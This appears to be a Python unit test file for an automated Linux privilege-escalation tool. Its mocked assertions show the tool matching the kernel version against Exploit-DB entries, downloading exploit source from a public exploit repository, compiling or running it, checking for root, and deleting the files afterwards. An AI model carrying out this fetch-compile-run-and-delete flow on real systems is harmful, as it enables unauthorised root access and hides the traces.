import unittest

import mock as mock

from elevator import find_keywords, run_escalator
from StringIO import StringIO

class EscalatorTest(unittest.TestCase):

    def test_whenUnameHas64BitsAndKernelVersion_thenExpectedResultFound(self):
        self.assertEqual(
            find_keywords('Linux kali 4.11.0-kali1-amd64 #1 SMP Debian 4.11.6-1kali1 (2017-06-21) x86_64 GNU/Linux'),
            ({'os': 'linux', 'version': '4.11'})
        )

    def test_whenCExploitRun_thenExpectedSystemCallsMade(self):
        url_opener = mock.Mock()
        with mock.patch('os.popen3', create=True) as mock_os_open3:
            self.run_with(mock_os_open3, url_opener,
                          b'1397,platforms/linux/local/1397.c,"Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - \'SYS_EPoll_Wait\' Integer Overflow Privilege Escalation",2005-12-30,alert7,linux,local,0'
                          )

        assert url_opener.mock_calls == [
            mock.call.retrieve('https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/1397.c', '1397.c')
        ]

        assert mock_os_open3.mock_calls == [
            mock.call('gcc 1397.c -o 1397 -lpthread -pthread -lcrypt -lssl -ldl; ', 'r'),
            mock.call('./1397', 'r'),
            mock.call('rm 1397.c', 'r'),
            mock.call('rm 1397', 'r')
        ]

    def test_whenPythonExploitRun_thenExpectedSystemCallsMade(self):
        url_opener = mock.Mock()
        with mock.patch('os.popen3', create=True) as mock_os_open3:
            self.run_with(mock_os_open3, url_opener,
                          b'9844,platforms/linux/local/9844.py,"Linux Kernel 2.4.1 < 2.4.37 / 2.6.1 < 2.6.32-rc5 - \'pipe.c\' Privilege Escalation (3)",2009-11-05,"Matthew Bergin",linux,local,0'
                          )

            assert url_opener.mock_calls == [
                mock.call.retrieve('https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/9844.py', '9844.py')
            ]

            assert mock_os_open3.mock_calls == [
                mock.call('python 9844.py', 'r'),
                mock.call('rm 9844.py', 'r'),
            ]

    def test_whenPerlExploitRun_thenExpectedSystemCallsMade(self):
        url_opener = mock.Mock()
        with mock.patch('os.popen3', create=True) as mock_os_open3:
            self.run_with(mock_os_open3, url_opener,
                          b'20765,platforms/linux/local/20765.pl,"Linux Kernel 2.6 - IPTables FTP Stateful Inspection Arbitrary Filter Rule Insertion",2001-04-16,"Cristiano Lincoln Mattos",linux,local,0'
                          )
            assert url_opener.mock_calls == [
                mock.call.retrieve('https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/20765.pl', '20765.pl')
            ]

            assert mock_os_open3.mock_calls == [
                mock.call('perl 20765.pl', 'r'),
                mock.call('rm 20765.pl', 'r')
            ]

    def test_whenPhpExploitRun_thenExpectedSystemCallsMade(self):
        url_opener = mock.Mock()
        with mock.patch('os.popen3', create=True) as mock_os_open3:
            self.run_with(mock_os_open3, url_opener,
                          b'3479,platforms/linux/local/3479.php,"PHP 5.2.1 - \'session_regenerate_id()\' Linux kernel 2.6 Double-Free Exploit",2007-03-14,"Stefan Esser",linux,local,0',
                          'uid=0(root) gid=0(root)'
                          )
            assert url_opener.mock_calls == [
                mock.call.retrieve('https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/3479.php', '3479.php')
            ]

            assert mock_os_open3.mock_calls == [
                mock.call('php 3479.php', 'r'),
                mock.call('rm 3479.php', 'r')
            ]

    def test_whenShExploitRun_thenExpectedSystemCallsMade(self):
        url_opener = mock.Mock()
        with mock.patch('os.popen3', create=True) as mock_os_open3:
            self.run_with(mock_os_open3, url_opener,
                          b'24459,platforms/linux/local/24459.sh,"Linux Kernel 2.6.32-5 (Debian 6.0.5) - \'/dev/ptmx\' Key Stroke Timing Local Disclosure",2013-02-05,vladz,linux,local,0'
                          )

            assert url_opener.mock_calls == [
                mock.call.retrieve('https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/24459.sh', '24459.sh')
            ]

            assert mock_os_open3.mock_calls == [
                mock.call('sh 24459.sh', 'r'),
                mock.call('rm 24459.sh', 'r')
            ]

    def run_with(self, mock_os_open3, url_opener, exploit, id_out='foo'):
        mock.return_value = ['foo']
        with mock.patch('sys.exit', create=True) as mock_sys_exit:
            with mock.patch('os.popen', mock.mock_open(
                    read_data='Linux kali 2.6.0-kali1-amd64 #1 SMP Debian 4.11.6-1kali1 (2017-06-21) x86_64 GNU/Linux')):
                with mock.patch('os.path.exists', create=True) as mock_exists:
                    with mock.patch('__builtin__.open', mock.mock_open(
                            read_data=exploit),
                                    create=True):
                        mock_os_open3.return_value = (
                            mock.MagicMock(spec=file), mock.MagicMock(spec=file, wraps=StringIO(id_out)),
                            mock.MagicMock(spec=file))
                        mock_exists.return_value = True

                        run_escalator(url_opener)